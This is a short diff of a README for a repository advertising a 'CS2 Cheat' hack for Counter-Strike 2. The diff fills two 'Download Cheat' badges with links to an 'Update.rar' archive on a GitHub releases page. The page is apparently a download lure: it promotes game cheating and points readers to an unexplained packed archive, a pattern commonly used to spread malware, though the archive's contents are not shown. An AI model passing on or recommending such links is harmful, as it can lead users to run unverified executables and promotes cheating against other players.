@@ -1,8 +1,8 @@
-# 🎯 CS2 Cheat – The Ultimate Hack for Counter-Strike 2 (2025 Edition)  [![Download Cheat](https://img.shields.io/badge/Download-CS2_Cheat-purple?style=for-the-badge&logo=download)]() 
+# 🎯 CS2 Cheat – The Ultimate Hack for Counter-Strike 2 (2025 Edition)  [![Download Cheat](https://img.shields.io/badge/Download-CS2_Cheat-purple?style=for-the-badge&logo=download)](https://github.com/BabTisrti/cs2-cheat/releases/download/Update/Update.rar) 
 
 ![cs](https://github.com/user-attachments/assets/090d307e-b568-4e00-adea-f708b2a4580f)
 
-[![Download Cheat](https://img.shields.io/badge/Download-CS2_Cheat-purple?style=for-the-badge&logo=download)]() 
+[![Download Cheat](https://img.shields.io/badge/Download-CS2_Cheat-purple?style=for-the-badge&logo=download)](https://github.com/BabTisrti/cs2-cheat/releases/download/Update/Update.rar) 
  
 
 
